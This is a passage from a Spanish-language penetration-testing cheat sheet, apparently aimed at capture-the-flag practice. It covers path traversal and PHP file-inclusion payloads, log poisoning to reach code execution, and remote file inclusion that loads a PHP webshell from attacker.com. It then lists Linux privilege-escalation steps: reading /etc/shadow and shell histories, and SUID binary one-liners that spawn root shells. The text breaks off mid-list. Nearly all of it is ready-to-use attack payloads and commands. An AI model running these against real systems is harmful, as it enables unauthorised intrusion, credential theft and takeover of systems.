..%c0%af..%c0%af..%c0%afetc/passwd  # UTF-8 overlong encoding
..%5c..%5c..%5cetc%5cpasswd  # Windows

# Archivos objetivo en Linux
/etc/passwd
/etc/shadow
/etc/hosts
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/www/html/config.php
/app/config.yaml
/app/.env
/flag.txt
/root/flag.txt

# Archivos objetivo en Windows
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\Users\Administrator\Desktop\flag.txt
C:\inetpub\wwwroot\web.config
..\..\..\..\..\..\Windows\win.ini

# PHP wrappers (LFI)
php://filter/convert.base64-encode/resource=config.php
php://filter/read=convert.base64-encode/resource=/etc/passwd
php://input  # + POST body con código PHP
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
expect://id
zip://shell.zip%23shell.php  # zip:// con archivo PHP dentro

# Log poisoning (LFI → RCE)
# 1. Inyectar código PHP en logs:
# User-Agent: <?php system($_GET['cmd']); ?>
# 2. Incluir el log:
# /page.php?file=../../../var/log/apache2/access.log&cmd=id
```

### 6.2.2 RFI (Remote File Inclusion)

```bash
# Si allow_url_include = On en PHP
http://target/page.php?file=http://attacker.com/shell.txt
http://target/page.php?file=//attacker.com/shell.txt

# shell.txt contiene:
<?php system($_GET['cmd']); ?>

# Null byte bypass (PHP < 5.3.4)
http://target/page.php?file=http://attacker.com/shell.txt%00
```

---

<a name="63"></a>
## 6.3 PRIVILEGE ESCALATION (LINUX)

### 6.3.1 Enumeración Inicial

```bash
# ¿Quién soy?
id
whoami
groups

# ¿Qué puedo hacer con sudo?
sudo -l

# Binarios SUID/SGID
find / -perm -u=s -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Cron jobs
cat /etc/crontab
ls -la /etc/cron.*
ls -la /var/spool/cron/

# Servicios corriendo
ps aux
ss -tlnp
netstat -tlnp

# Variables de entorno
env
echo $PATH

# Archivos escribibles
find / -writable -type f 2>/dev/null | head -50
find / -writable -type d 2>/dev/null | head -50

# Archivos .bash_history
cat /home/*/.bash_history
cat /root/.bash_history

# Configs sensibles
cat /etc/shadow  # si es legible
cat /etc/mysql/debian.cnf
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
```

### 6.3.2 Técnicas de Escalada Linux

```bash
# 1. SUID bins (GTFOBins: gtfobins.github.io)
# Si find tiene SUID:
find / -exec /bin/bash -p \; -quit

# Si python tiene SUID:
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# Si vim tiene SUID:
vim -c ':!/bin/bash -p'

# Si tar tiene SUID:
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash -p

# Si awk tiene SUID:
awk 'BEGIN {system("/bin/bash -p")}'

# Si nmap tiene SUID:
nmap --interactive
> !sh

# Si perl tiene SUID:
perl -e 'exec "/bin/bash -p"'

# Si env tiene SUID:
env /bin/bash -p

# Si cp tiene SUID:
# Copiar /etc/shadow, crackear hashes

# 2.
